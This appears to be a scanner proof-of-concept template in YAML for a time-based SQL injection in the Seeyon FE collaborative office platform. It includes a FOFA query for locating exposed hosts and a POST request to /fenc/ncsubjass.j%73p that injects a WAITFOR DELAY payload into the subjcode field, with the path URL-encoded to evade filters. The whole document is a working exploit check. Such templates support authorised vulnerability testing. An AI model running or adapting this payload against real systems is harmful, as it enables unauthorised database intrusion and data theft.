id: poc-yaml-seeyon-hulian-fe-ncsubjass-sqli
info:
  name: 致远互联FE协作办公平台 ncsubjass SQL注入漏洞
  severity: high
  tags:
  - sql-injection
  finger: 致远互联-FE
  fofa: app="致远互联-FE"
variables:
  t1: random_int(5,10)
  t2: t1 + 2
requests:
- method: POST
  path: /fenc/ncsubjass.j%73p
  headers:
    Content-Type: application/x-www-form-urlencoded
  data: subjcode=';WAITFOR DELAY '0:0:{{.t1}}'--
  expression: status_code == 200 && contains(body,"WAITFOR DELAY") && contains(body,"hideWindowPanelById")
    && duration > t1 && duration < t2
transport: http
